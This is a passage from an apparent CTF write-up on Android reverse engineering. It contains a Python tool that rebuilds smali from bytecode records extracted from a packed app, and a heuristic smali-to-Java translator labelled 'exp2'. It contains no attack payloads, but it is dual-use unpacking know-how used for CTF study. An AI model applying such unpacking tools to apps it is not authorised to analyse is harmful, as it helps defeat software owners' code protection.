class="subst">&#123;tgt_abs:04x&#125;</span>&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">f&quot;    <span class="subst">&#123;lbl&#125;</span>&quot;</span>)</span><br><span class="line">            lines.append(<span class="string">&quot;.end packed-switch&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> lines</span><br><span class="line">        <span class="keyword">if</span> u0 == <span class="number">0x0200</span>:</span><br><span class="line">            size = units[pc0 + <span class="number">1</span>] <span class="keyword">if</span> pc0 + <span class="number">1</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            base_pc = switch_bases.get(pc0, pc0)</span><br><span class="line">            lines.append(<span class="string">&quot;.sparse-switch&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                kp = pc0 + <span class="number">2</span> + i * <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> kp + <span class="number">3</span> &gt;= insns_size:</span><br><span class="line">                    lines.append(<span class="string">&quot;# truncated pairs&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                key = s32_from_u2(units[kp], units[kp + <span class="number">1</span>])</span><br><span class="line">                tgt_rel = s32_from_u2(units[kp + <span class="number">2</span>], units[kp + <span class="number">3</span>])</span><br><span class="line">                tgt_abs = base_pc + tgt_rel</span><br><span class="line">                lbl = label_for_pc.get(tgt_abs, <span class="string">f&quot;:L<span class="subst">&#123;tgt_abs:04x&#125;</span>&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">f&quot;    <span class="subst">&#123;hex32(key)&#125;</span> -&gt; <span class="subst">&#123;lbl&#125;</span>&quot;</span>)</span><br><span class="line">            lines.append(<span class="string">&quot;.end sparse-switch&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> lines</span><br><span class="line">        <span class="keyword">if</span> u0 == <span class="number">0x0300</span>:</span><br><span class="line">            elem_width = units[pc0 + <span class="number">1</span>] <span class="keyword">if</span> pc0 + <span class="number">1</span> &lt; insns_size <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">            size = (units[pc0 + <span class="number">3</span>] &lt;&lt; <span class="number">16</span> | units[pc0 + <span class="number">2</span>]) <span class="keyword">if</span> pc0 + <span class="number">3</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            lines.append(<span class="string">f&quot;.array-data <span class="subst">&#123;elem_width&#125;</span>&quot;</span>)</span><br><span class="line">            byte_off = pc0 * <span class="number">2</span> + <span class="number">8</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                start = byte_off + i * elem_width</span><br><span class="line">                end = start + elem_width</span><br><span class="line">                <span class="keyword">if</span> end &gt; <span class="built_in">len</span>(insns_bytes): <span class="keyword">break</span></span><br><span class="line">                val = <span class="built_in">int</span>.from_bytes(insns_bytes[start:end], <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">                lines.append(<span class="string">f&quot;    <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">            lines.append(<span class="string">&quot;.end array-data&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> lines</span><br><span class="line">        <span class="keyword">return</span> content_lines</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pc0, sz, content <span class="keyword">in</span> decoded:</span><br><span class="line">        <span class="keyword">if</span> pc0 <span class="keyword">in</span> label_for_pc:</span><br><span class="line">            out.append(label_for_pc[pc0])</span><br><span class="line">        u0 = units[pc0]</span><br><span class="line">        <span class="keyword">if</span> u0 <span class="keyword">in</span> (<span class="number">0x0100</span>, <span class="number">0x0200</span>, <span class="number">0x0300</span>):</span><br><span class="line">            out += render_payload(pc0, content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fixed = []</span><br><span class="line">            <span class="keyword">for</span> ln <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;packed-switch&quot;</span> <span class="keyword">in</span> ln <span class="keyword">or</span> <span class="string">&quot;sparse-switch&quot;</span> <span class="keyword">in</span> ln <span class="keyword">or</span> <span class="string">&quot;fill-array-data&quot;</span> <span class="keyword">in</span> ln:</span><br><span class="line">                    <span class="keyword">for</span> tgt, lbl <span class="keyword">in</span> payload_labels.items():</span><br><span class="line">                        ln = ln.replace(<span class="string">f&quot;:payload_<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>, lbl)</span><br><span class="line">                fixed.append(ln)</span><br><span class="line">            out += fixed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disasm_pack</span>(<span class="params">path: <span class="built_in">str</span>, regs_size: <span class="built_in">int</span>, ins_size: <span class="built_in">int</span>, dex: <span class="type">Optional</span>[DexFile]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    out_all: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">    total = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">while</span> pos + <span class="number">8</span> &lt;= total:</span><br><span class="line">        off_u32, units = struct.unpack_from(<span class="string">&#x27;&lt;II&#x27;</span>, data, pos)</span><br><span class="line">        pos += <span class="number">8</span></span><br><span class="line">        need = units * <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> units == <span class="number">0</span> <span class="keyword">or</span> pos + need &gt; total:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        insns = data[pos:pos + need]</span><br><span class="line">        pos += need</span><br><span class="line">        smali = decode_block(insns, regs_size, ins_size, dex)</span><br><span class="line">        out_all.append(<span class="string">f&quot;# record <span class="subst">&#123;idx&#125;</span>: file_off=<span class="subst">&#123;<span class="built_in">hex</span>(off_u32)&#125;</span> units=<span class="subst">&#123;units&#125;</span> bytes=<span class="subst">&#123;need&#125;</span>\n<span class="subst">&#123;smali&#125;</span>\n&quot;</span>)</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;# no records parsed (check file format)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(out_all)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python disassemble.py &lt;input_file&gt; &lt;dex_file&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dex_path = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 寄存器数量和输入参数数量，根据实际情况调整</span></span><br><span class="line">    regs = <span class="number">64</span></span><br><span class="line">    ins = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    dex = DexFile(dex_path)</span><br><span class="line">    smali = disasm_pack(path, regs, ins, dex)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.smali&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(smali)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Disassembly completed. Output saved to out.smali&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python xxx.py extract.dat classes.dex</span><br></pre></td></tr></table></figure>

<p>得到out.smali  smali –&gt; java</p>
<p>exp2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">smali2java.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Lightweight heuristic smali -&gt; java-like translator for small smali fragments</span></span><br><span class="line"><span class="string">(works on the &#x27;# record N: ...&#x27; style blocks like in the user&#x27;s sample).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python3 smali2java.py input.smali.txt &gt; output.java</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Notes:</span></span><br><span class="line"><span class="string"> - This is NOT a full decompiler. It maps common smali instructions to readable Java-like lines.</span></span><br><span class="line"><span class="string"> - Useful for quickly reading what smali is doing; output needs manual cleanup.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Helpers ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_records</span>(<span class="params">lines: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">dict</span>]:</span><br><span class="line">    records = []</span><br><span class="line">    cur = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;^# record\s+(\d+):\s*(.*)$&quot;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">if</span> cur:</span><br><span class="line">                records.append(cur)</span><br><span class="line">            cur = &#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">int</span>(m.group(<span class="number">1</span>)), <span class="string">&quot;header&quot;</span>: m.group(<span class="number">2</span>), <span class="string">&quot;body&quot;</span>: []&#125;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> cur <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># collect lines until next record</span></span><br><span class="line">        cur[<span class="string">&quot;body&quot;</span>].append(line.rstrip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> cur:</span><br><span class="line">        records.append(cur)</span><br><span class="line">    <span class="keyword">return</span> records</span><br><span class="line"></span><br><span class="line"><span class="comment"># map registers v0..vN to readable names: var0, var1, this if v0? (heuristic)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vname</span>(<span class="params">v: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># v may be like &quot;v0&quot; or &quot;p0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> v.replace(<span class="string">&quot;v&quot;</span>, <span class="string">&quot;var&quot;</span>).replace(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;arg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_array_data</span>(<span class="params">block_lines: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># find .array-data and bytes then create Java array literal</span></span><br><span class="line">    arr = []</span><br><span class="line">    in_array = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> block_lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.array-data&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            in_array = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> in_array:</span><br><span class="line">            <span class="keyword">if</span> L.strip().startswith(<span class="string">&quot;.end array-data&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># lines like 0x76</span></span><br><span class="line">            tokens = L.strip().split()</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> tokens:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    val = <span class="built_in">int</span>(t, <span class="number">16</span>)</span><br><span class="line">                    arr.append(<span class="built_in">str</span>(val))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;new byte[]&#123;%s&#125;&quot;</span> % (<span class="string">&quot;, &quot;</span>.join(arr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># translate a single record body to a Java-like snippet</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">translate_body</span>(<span class="params">body: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    out = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="comment"># accumulate array-data blocks</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&quot;.array-data&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> body):</span><br><span class="line">        <span class="comment"># try to detect the sput-object with TARGET and attach the array literal</span></span><br><span class="line">        <span class="comment"># naive: find sput-object line target field name</span></span><br><span class="line">        sput = <span class="built_in">next</span>((l <span class="keyword">for</span> l <span class="keyword">in</span> body <span class="keyword">if</span> <span class="string">&quot;sput-object&quot;</span> <span class="keyword">in</span> l), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> sput:</span><br><span class="line">            <span class="comment"># sput-object v0, Lcom/swdd/strangeapp/MainActivity;-&gt;TARGET:[B</span></span><br><span class="line">            m = re.search(<span class="string">r&quot;sput-object\s+\S+,\s+L([^;]+);-&gt;(\w+):(\[B)&quot;</span>, sput)</span><br><span class="line">            <span class="keyword">if</span> m:</span><br><span class="line">                class_path = m.group(<span class="number">1</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">                field = m.group(<span class="number">2</span>)</span><br><span class="line">                arr_lit = decode_array_data(body)</span><br><span class="line">                out.append(<span class="string">&quot;/* static byte[] %s.%s initialized */&quot;</span> % (class_path, field))</span><br><span class="line">                out.append(<span class="string">&quot;private static byte[] %s = %s;&quot;</span> % (field, arr_lit))</span><br><span class="line">                <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="comment"># generic instruction translations</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> L.strip() <span class="keyword">or</span> L.strip().startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># .registers N  -&gt; comment</span></span><br><span class="line">        <span class="keyword">if</span> L.strip().startswith(<span class="string">&quot;.registers&quot;</span>):</span><br><span class="line">            out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># const-string v0, &quot;...&quot;</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*const-string\s+(\S+),\s+\&quot;(.*)\&quot;&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = \&quot;%s\&quot;;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># const/4 v0, 0  or const/16</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*const(?:/\w+)?\s+(\S+),\s+(-?\d+|0x[0-9a-fA-F]+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = %s;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># new-instance v2, Lcom/xxx/MyClass;</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*new-instance\s+(\S+),\s+L([^;]+);&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = new %s();&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># new-array v0, vN, [B  =&gt; byte[] arr = new byte[len];</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*new-array\s+(\S+),\s+(\S+),\s+\[B&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = new byte[%s];&quot;</span> % (vname(m.group(<span class="number">1</span>)), vname(m.group(<span class="number">2</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># fill-array-data v0, :array_000a  -&gt; handled by array-data block</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fill-array-data&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># iput-object v0, v1, Lcom/...;-&gt;f$0:Type</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*iput-object\s+(\S+),\s+(\S+),\s+L([^;]+);-&gt;([^:]+):(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s.%s = %s;&quot;</span> % (vname(m.group(<span class="number">2</span>)), m.group(<span class="number">4</span>), vname(m.group(<span class="number">1</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># sput-object v0, Lcom/...;-&gt;TARGET:[B  (static put)</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*sput-object\s+(\S+),\s+L([^;]+);-&gt;([^:]+):(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s.%s = %s;&quot;</span> % (m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), m.group(<span class="number">3</span>), vname(m.group(<span class="number">1</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># sget-object v2, Lcom/...;-&gt;TARGET:[B</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*sget-object\s+(\S+),\s+L([^;]+);-&gt;([^:]+):(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = %s.%s;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), m.group(<span class="number">3</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-direct &#123;v0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-direct\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;(\S+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            method_owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            method_name = m.group(<span class="number">3</span>)</span><br><span class="line">            params = m.group(<span class="number">4</span>)</span><br><span class="line">            out.append(<span class="string">&quot;// constructor call: %s.%s(%s)  // from regs %s&quot;</span> % (method_owner, method_name, params, <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(vname, regs))))</span><br><span class="line">            <span class="keyword">if</span> method_name == <span class="string">&quot;&lt;init&gt;&quot;</span>:</span><br><span class="line">                <span class="comment"># make a new-expression if single reg used as receiver assignment</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(regs) &gt;= <span class="number">1</span>:</span><br><span class="line">                    out.append(<span class="string">&quot;%s = new %s();&quot;</span> % (vname(regs[<span class="number">0</span>]), method_owner))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-virtual &#123;v3, v0&#125;, Lcom/swdd/...;-&gt;setContentView(I)V</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-virtual\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;([^()]+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            mname = m.group(<span class="number">3</span>)</span><br><span class="line">            sig = m.group(<span class="number">4</span>)</span><br><span class="line">            args = <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs[<span class="number">1</span>:]) <span class="keyword">if</span> <span class="built_in">len</span>(regs) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)</span><br><span class="line">            <span class="comment"># heuristic: if first register is &#x27;v3&#x27; likely it&#x27;s &quot;this&quot;</span></span><br><span class="line">            out.append(<span class="string">&quot;%s.%s(%s);&quot;</span> % (vname(regs[<span class="number">0</span>]), mname, args))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-static (call static method)</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-static\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;([^()]+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            mname = m.group(<span class="number">3</span>)</span><br><span class="line">            args = <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)</span><br><span class="line">            out.append(<span class="string">&quot;%s.%s(%s);&quot;</span> % (owner, mname, args))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-super &#123;v3, v4&#125;, Landroidx/...;-&gt;onCreate(Landroid/os/Bundle;)V</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-super\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;([^()]+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            mname = m.group(<span class="number">3</span>)</span><br><span class="line">            out.append(<span class="string">&quot;super.%s(%s);&quot;</span> % (mname, <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs[<span class="number">1</span>:])))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># return-void / return-object v2</span></span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\breturn-void\b&quot;</span>, L):</span><br><span class="line">            out.append(<span class="string">&quot;return;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*return-object\s+(\S+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;return %s;&quot;</span> % vname(m.group(<span class="number">1</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*return-(?:value|v32)?\s+(\S+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;return %s;&quot;</span> % vname(m.group(<span class="number">1</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># check-cast / check-cast v0, Landroid/widget/EditText;</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*check-cast\s+(\S+),\s+L([^;]+);&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = (%s) %s;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), vname(m.group(<span class="number">1</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># find view: invoke-virtual &#123;this, id&#125;, L...;-&gt;findViewById(I)Landroid/view/View;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;findViewById&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line">            <span class="comment"># try to convert to: varX = findViewById(id);</span></span><br><span class="line">            m = re.search(<span class="string">r&quot;findViewById\((I)?\)&quot;</span>, L)</span><br><span class="line">            <span class="comment"># fallback simple comment</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># substring/charAt/xor/text constructs (simple heuristics)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;charAt&quot;</span> <span class="keyword">in</span> L <span class="keyword">or</span> <span class="string">&quot;substring&quot;</span> <span class="keyword">in</span> L <span class="keyword">or</span> <span class="string">&quot;StringBuilder&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            out.append(<span class="string">&quot;// string manipulation: &quot;</span> + L.strip())</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># fallback: keep the original line as a comment for inspection</span></span><br><span class="line">        out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Main ------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 smali2java.py input.smali.txt&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Output is printed to stdout. Redirect to a file if you want.&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="comment"># read stdin as fallback</span></span><br><span class="line">        data = sys.stdin.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">    lines = data.splitlines()</span><br><span class="line">    records = read_records(lines)</span><br><span class="line"></span><br><span class="line">    header = []</span><br><span class="line">    body_lines = []</span><br><span class="line">    header.append(<span class="string">&quot;// Generated by smali2java.py (heuristic).&quot;</span>)</span><br><span class="line">    header.append(<span class="string">&quot;// Input records: %d&quot;</span> % <span class="built_in">len</span>(records))</span><br><span class="line">    header.append(<span class="string">&quot;public class Decompiled &#123;&quot;</span>)</span><br><span class="line">    header.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    footer = [<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># collect static fields from records (like TARGET array)</span></span><br><span class="line">    static_fields = []</span><br><span class="line">    methods = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> rec <span 